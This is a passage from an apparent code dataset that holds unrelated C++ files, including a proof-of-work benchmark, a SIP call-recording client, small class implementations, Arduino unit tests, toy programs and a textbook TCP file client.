Billions of solutions\n        displayValue = solutionsPerSecond / 1e9;\n        suffix = \"GSol/s\";\n    } else if (solutionsPerSecond >= 1e6) {\n        // Millions of solutions\n        displayValue = solutionsPerSecond / 1e6;\n        suffix = \"MSol/s\";\n    } else if (solutionsPerSecond >= 1e3) {\n        // Thousands of solutions\n        displayValue = solutionsPerSecond / 1e3;\n        suffix = \"KSol/s\";\n    } else {\n        // Solutions (<1000)\n        displayValue = solutionsPerSecond;\n        suffix = \"sol/s\";\n    }\n\n    // Print the result\n    printf(\"%s: %.2f %s\\n\", label.c_str(), displayValue, suffix.c_str());\n\n    // Return the solutions per second\n    return solutionsPerSecond;\n}\n\n/**\n * @brief Generates a random vector of the specified size.\n *\n * @param size Size of the vector.\n *\n * @return A vector of random bytes.\n */\nstd::vector<unsigned char> GenerateRandomBytes(std::size_t size)\n{\n    // Create a vector to hold random bytes\n    std::vector<unsigned char> vch(size);\n\n    // Create a random number generator\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(0, 255);\n\n    // Fill the vector with random values\n    for (std::size_t i = 0; i < size; ++i) {\n        vch[i] = static_cast<unsigned char>(dis(gen));\n    }\n\n    return vch;\n}\n\n/**\n * @brief Benchmarks the generation of solutions.\n */\nvoid BenchGenerated()\n{\n    // Create a graph object\n    CGraph graph;\n\n    // Create a path object\n    CPath path;\n\n    // Define time points for measurement\n    std::chrono::high_resolution_clock::time_point start;\n    std::chrono::high_resolution_clock::time_point end;\n\n    // Duration for elapsed time measurement\n    std::chrono::duration<double> elapsed;\n\n    // Number of solutions generated\n    std::size_t nGenerated = 0;\n\n    // Initialize the graph with public and secret keys\n    graph.Initialize(publicKey, secretKey);\n\n    // Get the number of cores available on the system\n    uint8_t numCores = std::thread::hardware_concurrency();\n\n    // Set the number of threads to be used for parallel DFS processing\n    graph.SetNumThreads(numCores);\n\n    // Measure time for generation\n    start = std::chrono::high_resolution_clock::now();\n\n    // Loop to generate a number of solutions\n    for (std::size_t i = 0; i < NUM_ITERATIONS; i++) {\n        // Create the header for the graph\n        int32_t nVersion = 2;\n        std::vector<unsigned char> hashPrevBlock = GenerateRandomBytes(32);\n        std::vector<unsigned char> hashMerkleRoot = GenerateRandomBytes(32);\n        std::vector<unsigned char> hashReserved(32, 0x00);\n        uint32_t nTime = GetTime();\n        uint32_t nBits = 0x1e1a7099;\n\n        // Create a stream to hold the header data\n        CStream header;\n        header << nVersion;\n        header << hashPrevBlock;\n        header << hashMerkleRoot;\n        header << hashReserved;\n        header << nTime;\n        header << nBits;\n\n        // Set the header in the graph\n        graph.SetHeader(header.Data());\n\n        // Generate a random nonce for the graph\n        std::vector<unsigned char>",
    "#include <pjsua2.hpp>\n#include <iostream>\n#include <csignal>\n\nusing namespace pj;\n\nbool isShutdown = false;\n\n\nenum loglevel{\n    FATAL_ERROR = 0,\n    ERROR,\n    WARNING,\n    INFO,\n    DEBUG,\n    TRACE,\n    DETAILED_TRACE,\n};\n\n\nclass MyCall : public Call {\n    public:\n        AudioMediaRecorder recorder;\n        \n        MyCall(Account &account, int callID = PJSUA_INVALID_ID)\n        : Call(account, callID)\n        { }\n\n        void printCallState(string state, string localUri, string remoteUri, long connectDuration, string callID){\n            std::cout << \"########## \" << \"Call-ID:\" << callID;\n            std::cout << \"\\t\";\n            std::cout << \"State:\" << state;\n            std::cout << \"\\t\";\n            std::cout << \"(\" << remoteUri << \" -> \" << localUri << \")\";\n            std::cout << \"\\t\";\n            std::cout << \"Duration:\" << connectDuration << \"sec\";\n            std::cout << std::endl;\n        }\n\n        string getWavFileName(){\n            CallInfo callInfo = getInfo();\n            return callInfo.callIdString + \".wav\";\n        }\n\n        void saveAudioMedio(AudioMedia audioMedio){\n            string fileName = getWavFileName();\n            recorder.createRecorder(fileName);\n            audioMedio.startTransmit(recorder);\n        }\n\n        void echoVoice(AudioMedia audioMedia){\n            AudDevManager& manager = Endpoint::instance().audDevManager();\n            audioMedia.startTransmit(manager.getPlaybackDevMedia());\n            manager.getCaptureDevMedia().startTransmit(audioMedia);\n        }\n\n        virtual void onCallState(OnCallStateParam &param){\n            CallInfo callInfo = getInfo();\n            if (callInfo.state == PJSIP_INV_STATE_CONNECTING || callInfo.state == PJSIP_INV_STATE_DISCONNECTED){\n                printCallState(callInfo.stateText, callInfo.localUri, callInfo.remoteUri, callInfo.connectDuration.sec, callInfo.callIdString);\n            }\n        }\n  \n        virtual void onCallMediaState(OnCallMediaStateParam &params)\n        {\n            CallInfo callInfo = getInfo();\n            for (unsigned i = 0; i < callInfo.media.size(); i++)\n            {\n                if (callInfo.media[i].type == PJMEDIA_TYPE_AUDIO)\n                {\n                    AudioMedia audioMedia = getAudioMedia(i);\n                    saveAudioMedio(audioMedia);\n                    echoVoice(audioMedia);\n                }\n            }\n        }\n};\n\n// Subclass to extend the Account and get notifications etc.\nclass MyAccount : public Account {\n    public:\n        virtual void onRegState(OnRegStateParam &param) {\n            AccountInfo accountInfo = getInfo();\n            std::cout << (accountInfo.regIsActive? \"*** Register:\" : \"*** Unregister:\")\n                    << \" code=\" << param.code << std::endl;\n        }\n        virtual void onIncomingCall(OnIncomingCallParam &incomingParam){\n            MyCall *call = new MyCall(*this, incomingParam.callId);\n            CallOpParam param;\n            param.statusCode = PJSIP_SC_OK;\n            call->answer(param);\n        }\n};\n\n\nvoid signalCallbackHandler(int signum) {\n    isShutdown = true;\n}\n\nint main(int argc, char* argv[]) {\n    if (argc != 4) {\n        std::cerr << \"Usage: \" << argv[0] << \" <SIP_Server> <user> <listen_port>\" << std::endl;\n        return EXIT_FAILURE;\n    }\n\n    const std::string sip_server = argv[1];\n    const std::string user = argv[2];\n\tconst int listen_port = std::stoi(argv[3]);\n    \n    Endpoint endpoint;\n\n    endpoint.libCreate();\n\n    // Initialize endpoint\n    EpConfig endpointConfig;\n    endpointConfig.logConfig.level = loglevel::WARNING;\n    endpointConfig.logConfig.consoleLevel = loglevel::WARNING;\n    endpoint.libInit(endpointConfig);\n\n    // Create SIP transport. Error handling sample is shown\n    TransportConfig transportConfig;\n    transportConfig.port = listen_port;\n    try {\n        endpoint.transportCreate(PJSIP_TRANSPORT_UDP, transportConfig);\n    } catch (Error &err) {\n        std::cout << err.info() << std::endl;\n        return 1;\n    }\n\n    // Start the library (worker threads etc)\n    endpoint.libStart();\n    std::cout << \"*** PJSUA2 STARTED ***\" << std::endl;\n\n    // Configure an AccountConfig\n    AccountConfig accountConfig;\n    accountConfig.idUri =  \"sip:\" + user + \"@\" + sip_server;\n    accountConfig.regConfig.registrarUri = \"sip:\" + sip_server;\n\n    // Create the account\n    MyAccount *account = new MyAccount;\n    account->create(accountConfig);\n\n    signal(SIGINT, signalCallbackHandler);\n    while(!isShutdown){\n       sleep(1);\n    }\n\n    // Delete the account. This will unregister from server\n    delete account;\n\n    return 0;\n}",
    "//This is the definition file for this project.\n//Made by David Tamaratare Oghenebrume\n//@lil-brumski on GitHub.\n\n#include <student.hpp>\n\n//These functions have a data type 'Database&' instead of 'void' so that its function can be chained with other functions. It has to 'return *this' to make that possible.\nDatabase& Database::checkStudent(std::string name, int olevel_credits, int age, int jambScore, int postUtmeScore){\n  this->name = name;\n  this->olevel_credits = olevel_credits;\n  this->age = age;\n  this->jambScore = jambScore;\n  this->postUtmeScore = postUtmeScore;\n  this->aggregate = ((this->jambScore / 8) + this->postUtmeScore);\n  this->admitted = false;\n  \n  return *this;\n}\n\nDatabase& Database::admission(){\n  //If all conditions are true, admission will be given to the candidate.\n  if(olevel_credits >= 5 && age >= 15 && jambScore >= 190 && aggregate >= 50){\n    std::cout << name << \" has been admitted!\" << std::endl;\n    //The 'admitted' variable will be set to 'true'.\n    admitted = true;\n  }\n  else{\n    std::cout << name << \" was not admitted.\\n\";\n  }\n  \n  return *this;\n}\n\nDatabase& Database::admissionList(){\n  //This object writes to a file.\n  std::ofstream File(\"../admission-list.txt\", std::ios::app);\n  \n  //This object reads from that same file to make sure the same student doesn't get admitted more than once.\n  std::ifstream Read(\"../admission-list.txt\");\n  \n  //This variable stores the admitted user's details.\n  std::string admittedCandidates = \"Name: \" + name + \", Age: \" + std::to_string(age) + \", Olevel Credits: \" + std::to_string(olevel_credits) + \", Jamb Score: \" + std::to_string(jambScore) + \", Post UTME Score: \" + std::to_string(postUtmeScore) + \", Aggregate Score: \" + std::to_string(aggregate) + std::string(\".\");\n  \n  //This variable takes in each admitted candidate's details and checks if they were given admission more than once.\n  std::string check;\n  \n  while(std::getline(Read, check)){    \n    if(check == admittedCandidates){\n      std::cout << \"Error: Profile already exists!\\n\";\n      admitted = false;\n    }     \n  }  \n  Read.close();\n  \n  //If a student is admitted, their details get printed to the external file.\n  if(admitted == true){\n    File << admittedCandidates << std::endl;\n    File << std::endl;\n  }\n    \n  return *this;\n}",
    "#include <iostream>\n#include <typeinfo>\n#include \"SimpleDS.h\"\n#include \"Log.h\"\n\nusing namespace std;\n\n\n//=========================================================================\ndouble pi = 3.14;\n\nconst char* const class_name = \"custome class SimpleDS::Rectangle\"; \n\n//===========================================\n//char* class_name = \"custome class SimpleDS::Rectangle\";    NOTE : compiler error\n/*g++ -std=c++11 -c -D_REENTRANT -D_GNU_SOURCE -DPERL_USE_SAFE_PUTENV -fno-strict-aliasing -pipe -fstack-protector -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -O2 -fPIC -m64  cpp/SimpleDS.cpp -o generated_files/obj/SimpleDS.o\ncpp/SimpleDS.cpp:11:20: warning: ISO C++ forbids converting a string constant to 'char*' [-Wwrite-strings]\n   11 | char* class_name = \"custome class SimpleDS::Rectangle\";\n      |                    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */\n//===========================================\n\n\nint some_no = 1001;\n#undef  CLASS_NAME\n#define CLASS_NAME \"[SimpleDS]\"\n\n\n\n//=========================================================================\nRectangle::~Rectangle() \n{\n    CLASS_FUNC_START;\n\n    CLASS_FUNC_END;\n}\n\nRectangle::Rectangle(int height, int width) : height(height), width(width)\n{\n    CLASS_FUNC_START;\n\n    CLASS_FUNC_END;\n}\n\nRectangle::Rectangle(const Rectangle &o) : height(o.height), width(o.width)\n{\n    CLASS_FUNC_START;\n    \n    CLASS_FUNC_MSG(\"Rectangle::Rectangle(const Rectangle &o)\");\n    \n    CLASS_FUNC_END;\n}\n\nRectangle &Rectangle::operator=(const Rectangle &o)\n{\n    CLASS_FUNC_START;\n    \n    height = o.height;\n    width = o.width;\n\n    CLASS_FUNC_END;\n    return *this;\n}\n\n\nbool Rectangle::set(int h, int w)\n{\n    CLASS_FUNC_START;\n    \n    height = h;\n    width = w;\n\n    CLASS_FUNC_END;\n    return true;\n}\n\nint Rectangle::area(){\n    CLASS_FUNC_START;\n    auto area = width * height;\n    CLASS_FUNC_END;\n    return area;\n}\n\nvoid Rectangle::show()\n{\n    CLASS_FUNC_START;\n    cout << endl<< \"Rectangle details: height : \"<<height<<\", width : \"<<width << endl;\n    CLASS_FUNC_END;\n}\n\nRectangle Rectangle::clone()\n{\n    CLASS_FUNC_START;\n    Rectangle r1(height,width);\n    CLASS_FUNC_END;\n    return r1;\n}\n\nbool Rectangle::classInfo()\n{\n    CLASS_FUNC_START_STATIC;\n    cout << endl<< \"class details: \"<<typeid(Rectangle).name()<< endl;\n    CLASS_FUNC_END;\n    return true;\n}\n\n//=========================================================================\nint calculateArea(int width, int height)\n{\n        FUNC_START;\n        auto area = width * height;\n        cout<<\"\\n value of pi = \"<<pi <<\", and color REd = \"<<RED<<endl;\n        FUNC_END;\n        return area;\n}\n\n//=========================================================================",
    "#include \"Pel\u00edcula.h\"\n\n/*\nConstructor*/\nPel\u00edcula::Pel\u00edcula()\n{\n    nombre=\"\";\n}\n/*Destructor\n*/\nPel\u00edcula::~Pel\u00edcula(){}\n\n/*Asigna un string al atributo nombre del objeto pel\u00edcula*/\nvoid Pel\u00edcula::setNombre(string nombre)\n{\n    this->nombre=nombre;\n}\n\n/*Asigna un string al atributo g\u00e9nero del objeto pel\u00edcula*/\nvoid Pel\u00edcula::setG\u00e9nero(string g\u00e9nero)\n{\n    this->g\u00e9nero=g\u00e9nero;\n}\n\n/*En base al atributo g\u00e9nero y a la variable global precioBase, asigna un double al atributo precio*/\nvoid Pel\u00edcula::setPrecio(double precioBase)\n{\n    if(g\u00e9nero==\"comedia\" or g\u00e9nero==\"drama\")\n        precio=precioBase+precioBase*0.1;\n    else\n    {\n        if(g\u00e9nero==\"romance\" or g\u00e9nero==\"acci\u00f3n\")\n            precio=precioBase+precioBase*0.15;\n        else\n        {\n            if(g\u00e9nero==\"suspenso\" or g\u00e9nero==\"terror\")\n                precio=precioBase+precioBase*0.18;\n            else\n            {\n                if(g\u00e9nero==\"ciencia ficci\u00f3n\" or g\u00e9nero==\"fantas\u00eda\")\n                    precio=precioBase+precioBase*0.23;\n            }\n        }\n    }\n}\n\n/*Le asigna un entero al atributo duraci\u00f3nH*/\nvoid Pel\u00edcula::setDuraci\u00f3nH(int duraci\u00f3nH)\n{\n    this->duraci\u00f3nH=duraci\u00f3nH;\n}\n\n/*Le asigna un entero al atributo duraci\u00f3nM*/\nvoid Pel\u00edcula::setDuraci\u00f3nM(int duraci\u00f3nM)\n{\n    this->duraci\u00f3nM=duraci\u00f3nM;\n}\n\n/*Devuelve un string que corresponde con el atributo nombre*/\nstring Pel\u00edcula::getNombre()\n{\n    return nombre;\n}\n/*Devuelve un string que corresponde con el atributo g\u00e9nero*/\nstring Pel\u00edcula::getG\u00e9nero()\n{\n    return g\u00e9nero;\n}\n/*Devuelve un entero que corresponde al atributo duraci\u00f3nH*/\nint Pel\u00edcula::getDuraci\u00f3nH()\n{\n    return duraci\u00f3nH;\n}\n/*Devuelve un entero que corresponde el atributo duraci\u00f3nM*/\nint Pel\u00edcula::getDuraci\u00f3nM()\n{\n    return duraci\u00f3nM;\n}\n",
    "#include \"GameSession.hpp\"\n\n#include <iostream>\n#include <sstream>\n\n#include \"DataManagerFactory.hpp\"\n\nnamespace abstract_game {\n    GameSession::GameSession(GameID const gameID, int const userID) : _gameID{gameID},\n                                                                      _userID{userID},\n                                                                      _gameSessionUID{calcGameSessionUID()},\n                                                                      _begin{time(nullptr)},\n                                                                      _end(0),\n                                                                      _startPoint{std::chrono::steady_clock::now()},\n                                                                      _ended{false},\n                                                                      _dataManager{\n                                                                          DataManagerFactory::create(\"CsvManager\")\n                                                                      } {\n    }\n\n    size_t GameSession::calcGameSessionUID() {\n        // get current time as string\n        std::string const timeString{\n            std::to_string(std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()))\n        };\n\n        // get random value as string\n        auto const duration{std::chrono::system_clock::now().time_since_epoch()};\n        auto const nanos{std::chrono::duration_cast<std::chrono::nanoseconds>(duration).count()};\n        std::srand(nanos);\n        std::string const randomString{std::to_string((std::rand() % 1000) + 1)};\n\n        // concatenate timeString and random value for hash input\n        std::stringstream ss;\n        ss << timeString << randomString;\n        std::string const hashInput{ss.str()};\n\n        // create hash from input\n        size_t const hash{std::hash<std::string>{}(hashInput)};\n\n        return hash;\n    }\n\n    void GameSession::increaseRunThroughCount() {\n        _runThroughCount++;\n    }\n\n    void GameSession::writeToDataManager() const {\n        _dataManager->saveGameSession(\n            _gameSessionUID,\n            _userID,\n            _gameID,\n            _begin,\n            _end,\n            _ended\n        );\n        _dataManager->saveRunThroughs(_gameRunThroughs);\n    }\n\n    void GameSession::end() {\n        _ended = true;\n\n        // save the current time as the end time of the game session\n        _endPoint = std::chrono::steady_clock::now();\n        _end = time(nullptr);\n        writeToDataManager();\n    }\n\n    void GameSession::addNewGameRunThrough(std::string const &resultUnit, double const &result) {\n        increaseRunThroughCount();\n        _gameRunThroughs.emplace_back(_gameSessionUID, _runThroughCount, resultUnit, result);\n    }\n} // abstract_game\n",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2024-09-15\n// PURPOSE: unit tests for the MCP3424 sensor\n//     URL: https://github.com/RobTillaart/MCP3424\n//          https://github.com/Arduino-CI/arduino_ci/blob/master/REFERENCE.md\n//\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual)\n// assertNotEqual(expected, actual)\n// assertLess(expected, actual)\n// assertMore(expected, actual)\n// assertLessOrEqual(expected, actual)\n// assertMoreOrEqual(expected, actual)\n// assertTrue(actual)\n// assertFalse(actual)\n// assertNull(actual)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"MCP3424.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"MCP3424_LIB_VERSION: %s\\n\", (char *) MCP3424_LIB_VERSION);\n\n  Wire.begin();\n  //  Wire.setTimeout(10000);\n}\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constants)\n{\n  assertEqualFloat(1, 1, 0.001);\n}\n\n\nunittest(test_constructors)\n{\n  MCP3421 mcp1;\n  MCP3422 mcp2;\n  MCP3423 mcp3;\n  MCP3424 mcp4;\n  MCP3426 mcp6;\n  MCP3427 mcp7;\n  MCP3428 mcp8;\n\n  //  base class\n  assertEqual(0,  mcp4.getChannel());\n  assertEqual(4,  mcp4.getMaxChannels());\n  assertEqual(1,  mcp4.getGain());\n  assertEqual(12, mcp4.getResolution());\n  assertEqual(1,  mcp4.getMode());\n\n  //  check MAX channels derived classes\n  assertEqual(1, mcp1.getMaxChannels());\n  assertEqual(2, mcp2.getMaxChannels());\n  assertEqual(2, mcp3.getMaxChannels());\n  assertEqual(4, mcp4.getMaxChannels());\n  assertEqual(2, mcp6.getMaxChannels());\n  assertEqual(2, mcp7.getMaxChannels());\n  assertEqual(4, mcp8.getMaxChannels());\n}\n\n\nunittest(test_channel)\n{\n  MCP3424 mcp;\n\n  assertEqual(0, mcp.getChannel());\n\n  assertTrue(mcp.setChannel(1));\n  assertEqual(1, mcp.getChannel());\n\n  assertTrue(mcp.setChannel(2));\n  assertEqual(2, mcp.getChannel());\n\n  assertTrue(mcp.setChannel(3));\n  assertEqual(3, mcp.getChannel());\n\n  // default\n  assertTrue(mcp.setChannel());\n  assertEqual(0, mcp.getChannel());\n\n  //  out of range\n  assertFalse(mcp.setChannel(5));\n}\n\n\nunittest(test_gain)\n{\n  MCP3424 mcp;\n\n  assertEqual(1, mcp.getGain());\n\n  assertTrue(mcp.setGain(2));\n  assertEqual(2, mcp.getGain());\n\n  assertTrue(mcp.setGain(4));\n  assertEqual(4, mcp.getGain());\n\n  assertTrue(mcp.setGain(8));\n  assertEqual(8, mcp.getGain());\n\n  //  default\n  assertTrue(mcp.setGain());\n  assertEqual(1, mcp.getGain());\n\n  //  out of range\n  assertFalse(mcp.setGain(0));\n}\n\n\nunittest(test_resolution)\n{\n  MCP3424 mcp;\n\n  assertEqual(12, mcp.getResolution());\n\n  assertTrue(mcp.setResolution(14));\n  assertEqual(14, mcp.getResolution());\n\n  assertTrue(mcp.setResolution(16));\n  assertEqual(16, mcp.getResolution());\n\n  assertTrue(mcp.setResolution(18));\n  assertEqual(18, mcp.getResolution());\n\n  //  default\n  assertTrue(mcp.setResolution());\n  assertEqual(12, mcp.getResolution());\n\n  //  out of range\n  assertFalse(mcp.setResolution(13));\n}\n\n\nunittest(test_mode)\n{\n  MCP3424 mcp;\n\n  assertEqual(1, mcp.getMode());\n\n  mcp.setSingleShotMode();\n  assertEqual(0, mcp.getMode());\n\n  mcp.setContinuousMode();\n  assertEqual(1, mcp.getMode());\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include <string>  // for std::string\r\n\r\nbool isPalindrome(const std::string& str) {\r\n    int left = 0;\r\n    int right = str.size() - 1;\r\n\r\n    while (left < right) {\r\n        // Move left index to the next alphanumeric character\r\n        while (left < right && !std::isalnum(str[left])) {\r\n            ++left;\r\n        }\r\n        // Move right index to the previous alphanumeric character\r\n        while (left < right && !std::isalnum(str[right])) {\r\n            --right;\r\n        }\r\n\r\n        // Compare characters in a case-insensitive manner\r\n        if (std::tolower(str[left]) != std::tolower(str[right])) {\r\n            return false;\r\n        }\r\n\r\n        ++left;\r\n        --right;\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    std::string input;\r\n    std::cout << \"WORD: \";\r\n    std::getline(std::cin, input);\r\n\r\n    if (isPalindrome(input)) {\r\n        std::cout << \"\\\"\" << input << \"\\\" is a palindrome.\" << std::endl;\r\n    } else {\r\n        std::cout << \"\\\"\" << input << \"\\\" is not a palindrome.\" << std::endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "\n#include <stdio.h>\n#include <string>\n#include <time.h>\n#include <ctype.h>\n\n#define ITER 10000000\n\nint main() {\n\n    clock_t start_time, end_time;\n    \n    int count = 0, i=0, j=0;\n    std::string str = \"This is a string for testing purposes.\";\n    double time_taken = 0;\n\n\n    /*****************************************************************\n        determinant loop demonstrating the proper way to use for loops.\n        count is known, therefore this loop can be optimized.\n        when count is known, us a for loop.\n    *****************************************************************/\n    count = 0;\n    start_time = clock();\n    int strn = str.size();\n    for(i=0; i<ITER; i++){\n        for (j=0; j<strn; j++) {\n            if (isalpha(str[j])) {\n                count++;\n            }\n        }\n    }\n    end_time = clock();\n    time_taken = (double)(end_time - start_time) / CLOCKS_PER_SEC;\n    printf(\"Time taken to execute determinant for loop: %f seconds\\n\", time_taken);\n\n    /*****************************************************************\n        indeterminant loop demonstrating the proper way to use while loops.\n        count is not known, therefore this loop cannot be optimized well.\n        however, given it is indeterminant, the proper loop is a while loop\n        because an indeterminant for loop will be just as bad performance,\n        but less readable and less maintainable since it potentially\n        confuses the reader. Use a while loop in cases like this.\n    *****************************************************************/\n    start_time = clock();\n    for(i=0; i<ITER; i++){\n        j = 0;\n        count=0;\n        while(str[j]!='\\0'){\n            if (isalpha(str[count])) {\n                count++;\n            }\n            j++;\n        }\n    }\n    end_time = clock();\n    time_taken = (double)(end_time - start_time) / CLOCKS_PER_SEC;\n    printf(\"Time taken to execute indeterminant while loop: %f seconds\\n\", time_taken);\n    \n    /*****************************************************************\n        indeterminant loop demonstrating the INCORRECT way to use for loops\n        count is not known, therefore this loop cannot be optimized.\n        performance is just as bad a while loop, but code is less readable\n        and maintainable, and is confusing to the reader\n    *****************************************************************/\n    count = 0;\n    start_time = clock();\n    for(i=0; i<ITER; i++){\n        for (j=0; str[j]!='\\0'; j++) {\n            if (isalpha(str[j])) {\n                count++;\n            }\n        }\n    }\n    end_time = clock();\n    time_taken = (double)(end_time - start_time) / CLOCKS_PER_SEC;\n    printf(\"Time taken to execute indeterminant for loop 1: %f seconds\\n\", time_taken);\n    \n    /*****************************************************************\n        indeterminant loop demonstrating the INCORRECT way to use for loops\n        count is not known, therefore this loop cannot be optimized.\n        performance is just as bad a while loop. in this case, the for loop\n        syntax is a relatively new C++ feature to make indeterminant for loops\n        more readable and more Python-like. A classic example of making a\n        bad idea worse. This loop compiles down to the same form (or worse)\n        as the previous loop, it just looks better on the surface.\n    *****************************************************************/\n    count = 0;\n    start_time = clock();\n    for(i=0; i<ITER; i++){\n        for (char c : str) {\n            if (isalpha(c)) {\n                count++;\n            }\n        }\n    }\n    end_time = clock();\n    time_taken = (double)(end_time - start_time) / CLOCKS_PER_SEC;\n    printf(\"Time taken to execute indeterminant for loop 2: %f seconds\\n\", time_taken);\n    \n    return 0;\n\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pks1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cmath>   \n#include <vector>   \n#include <limits>    \n\nstruct Calculation {\n    double num1;\n    double num2;\n    char operation;\n    double result;\n};\n\nvoid clearInput() {\n    std::cin.clear();\n    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n}\n\n\nvoid displayHistory(const std::vector<Calculation>& history) {\n    if (history.empty()) {\n        std::cout << \"No calculations performed yet.\" << std::endl;\n        return;\n    }\n\n    std::cout << \"\\nHistory of Calculations: \" << std::endl;\n    for (size_t i = 0; i < history.size(); ++i) {\n        std::cout << history[i].num1 << \" \" << history[i].operation << \" \" \n                  << history[i].num2 << \" = \" << history[i].result << std::endl;\n    }\n    std::cout << std::endl;\n}\n\n\ndouble performCalculation(double num1, double num2, char operation, bool& validOperation) {\n    double result = 0;\n    validOperation = true;\n\n    switch (operation) {\n        case '+':\n            result = num1 + num2;\n            break;\n        case '-':\n            result = num1 - num2;\n            break;\n        case '*':\n            result = num1 * num2;\n            break;\n        case '/':\n            if (num2 == 0) {\n                std::cout << \"Error: Division by zero is undefined.\" << std::endl;\n                validOperation = false;\n            } else {\n                result = num1 / num2;\n            }\n            break;\n        case '%':\n            if (num2 == 0) {\n                std::cout << \"Error: Modulus by zero is undefined.\" << std::endl;\n                validOperation = false;\n            } else {\n                result = static_cast<int>(num1) % static_cast<int>(num2);\n            }\n            break;\n        case '^':\n            result = std::pow(num1, num2);\n            break;\n        case 'r':\n            if (num1 < 0) {\n                std::cout << \"Error: Cannot calculate square root of a negative number.\" << std::endl;\n                validOperation = false;\n            } else {\n                result = std::sqrt(num1);\n            }\n            break;\n        default:\n            std::cout << \"Error: Invalid operation.\" << std::endl;\n            validOperation = false;\n            break;\n    }\n    return result;\n}\n\nint main() {\n    std::vector<Calculation> history;  \n    char choice;\n    double num1, num2, result;\n    char operation;\n    bool validOperation;\n    \n    std::cout << \"Welcome to the Advanced Calculator!\" << std::endl;\n\n    do {\n        std::cout << \"Enter the first number: \";\n        while (!(std::cin >> num1)) {\n            clearInput();\n            std::cout << \"Invalid input. Please enter a number: \";\n        }\n\n        std::cout << \"Enter an operation (+, -, *, /, %, ^, r for square root): \";\n        std::cin >> operation;\n\n      \n        if (operation != 'r') {\n            std::cout << \"Enter the second number: \";\n            while (!(std::cin >> num2)) {\n                clearInput();\n                std::cout << \"Invalid input. Please enter a number: \";\n            }\n        } else {\n            num2 = 0; \n        }\n\n        result = performCalculation(num1, num2, operation, validOperation);\n\n        if (validOperation) {\n            std::cout << \"Result: \" << result << std::endl;\n\n            \n            history.push_back({num1, num2, operation, result});\n        }\n\n        std::cout << \"Do you want to see the history of calculations? (y/n): \";\n        std::cin >> choice;\n        if (choice == 'y' || choice == 'Y') {\n            displayHistory(history);\n        }\n\n       \n        std::cout << \"Do you want to perform another calculation? (y/n): \";\n        std::cin >> choice;\n\n        clearInput();\n    } while (choice == 'y' || choice == 'Y');\n\n    std::cout << \"Thank you for using the Advanced Calculator. Goodbye!\" << std::endl;\n\n    return 0;\n}\n",
    "/* This page contains a client program that can request a file from the server program\n* on the next page. The server responds by sending the whole file.\n*/\n\n#include <sys/types.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netdb.h>\n\n#define SERVER_PORT 8080 /* arbitrary, but client & server must agree */\n#define BUFSIZE 4096  /* block transfer size */\n\nint main(int argc, char **argv)\n{\n  int c, s, bytes;\n  char buf[BUFSIZE];  /* buffer for incoming file */\n  struct hostent *h;  /* info about server */\n  struct sockaddr_in channel; /* holds IP address */\n  if (argc != 3) {printf(\"Usage: client server-name file-name\"); exit(-1);}\n  h = gethostbyname(argv[1]); /* look up host\u2019s IP address */\n  if (!h) {printf(\"gethostbyname failed to locate %s\", argv[1]); exit(-1);}\n\n  s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (s < 0) {printf(\"socket call failed\"); exit(-1);}\n  memset(&channel, 0, sizeof(channel));\n  channel.sin_family = AF_INET;\n  memcpy(&channel.sin_addr.s_addr, h->h_addr, h->h_length);\n  channel.sin_port = htons(SERVER_PORT);\n  c = connect(s, (struct sockaddr *) &channel, sizeof(channel));\n  if (c < 0) {printf(\"connect failed\"); exit(-1);}\n  /* Connection is now established. Send file name including 0 byte at end. */\n  write(s, argv[2], strlen(argv[2]) + 1);\n\n  /* Go get the file and write it to standard output.*/\n  while (1) {\n     bytes = read(s, buf, BUFSIZE); /* read from socket */\n     if (bytes <= 0) exit(0); /* check for end of file */\n     write(1, buf, bytes);  /* write to standard output */\n  }\n}\n",
